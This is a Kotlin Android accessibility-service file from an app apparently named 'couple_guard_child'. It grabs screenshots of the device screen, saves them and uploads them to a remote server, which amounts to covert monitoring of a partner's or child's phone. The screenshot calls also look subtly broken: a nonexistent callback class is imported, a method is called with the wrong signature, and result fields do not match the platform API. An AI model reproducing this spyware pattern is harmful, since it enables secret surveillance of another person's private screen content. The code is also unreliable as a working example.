package com.example.couple_guard_child.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.ScreenshotCallback
import android.accessibilityservice.ScreenshotResult
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.annotation.RequiresApi
import com.example.couple_guard_child.UploadHelper
import java.io.File
import java.io.FileOutputStream

class MyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MyAccessibilityService"
        const val ACTION_TAKE_SCREENSHOT = "com.example.couple_guard_child.TAKE_SCREENSHOT"
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {
        // Tidak dipakai, wajib override
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.action?.let { action ->
            if (action == ACTION_TAKE_SCREENSHOT) {
                takeScreenshot()
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun takeScreenshot() {
        Log.d(TAG, "📸 Requesting screenshot")
        val handler = Handler(Looper.getMainLooper())
        handler.post {
            try {
                takeScreenshot(
                    { result ->
                        handleScreenshotResult(result)
                    },
                    handler
                )
            } catch (e: Exception) {
                Log.e(TAG, "❌ Screenshot failed", e)
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun handleScreenshotResult(result: ScreenshotResult) {
        if (result.isSuccess) {
            val bitmap: Bitmap? = result.bitmap
            if (bitmap != null) {
                // Simpan ke file
                val file = File(filesDir, "screenshot_${System.currentTimeMillis()}.jpg")
                try {
                    FileOutputStream(file).use { out ->
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                    }
                    Log.d(TAG, "✅ Screenshot saved: ${file.absolutePath}")

                    // Upload ke server
                    UploadHelper.uploadScreenshot("DEVICE_ID_HERE", file.absolutePath)

                } catch (e: Exception) {
                    Log.e(TAG, "❌ Failed saving screenshot", e)
                }
            } else {
                Log.e(TAG, "❌ Screenshot bitmap null")
            }
        } else {
            Log.e(TAG, "❌ Screenshot result failed: ${result.error}")
        }
    }
}
